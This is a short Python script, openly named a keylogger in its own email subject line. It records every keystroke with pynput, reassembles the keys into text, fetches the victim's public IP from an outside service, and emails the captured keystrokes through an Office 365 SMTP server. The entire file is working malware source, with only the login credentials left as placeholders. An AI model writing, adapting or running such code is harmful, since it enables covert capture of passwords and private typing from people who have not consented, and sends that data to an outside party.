from pynput import keyboard
import smtplib
import time
import socket
import requests
import os
import urllib


global unprocessed_string, string
unprocessed_string = []
string = []

def main():
	with keyboard.Listener( on_press = on_press, on_release = on_release) as listener:
		listener.join()
	format()
	string_to_text()
	mail()

def on_press(key):
	print(str(key))
	unprocessed_string.append(str(key))
	print(unprocessed_string)

def on_release(key):
	if key == keyboard.Key.esc:
		return False #stops listener

def format():
	for item in unprocessed_string:
		if 'Key.backspace' == item:
			try:
				del(string[-1])
			except:
				continue
		elif 'Key.space' == item:
			string.append(" ")
		elif 'Key.esc' == item:
			continue
		elif 'Key.ctrl' == item:
			string.append("-ctrl-")
		elif 'Key.shift' == item:
			string.append("-shift-")
		elif 'Key.down' == item:
			string.append("")
		elif 'Key.up' == item:
			string.append("")
		elif 'Key.right' == item:
			string.append("")
		elif 'Key.left' == item:
			string.append("")
		elif 'Key.enter' == item:
			string.append("")
		else:
			string.append(item)
	print(string)

def string_to_text():
	global texts
	texts = ""
	for item in string:
		texts += item.replace("'","")
	print(texts)


def mail():
	smtp = smtplib.SMTP("smtp.office365.com:587")
	smtp.starttls()
	smtp.login("email address", "password")
	subject = "Keylogger from " + requests.get('http://ip.42.pl/raw').text + " - " + str(time.strftime('%d/%m/%Y %H:%M:%S')) 
	msg = "Subject: {}\n\n{}".format(subject,texts)
	smtp.sendmail("email address", "email address", msg)
	smtp.quit()


main()
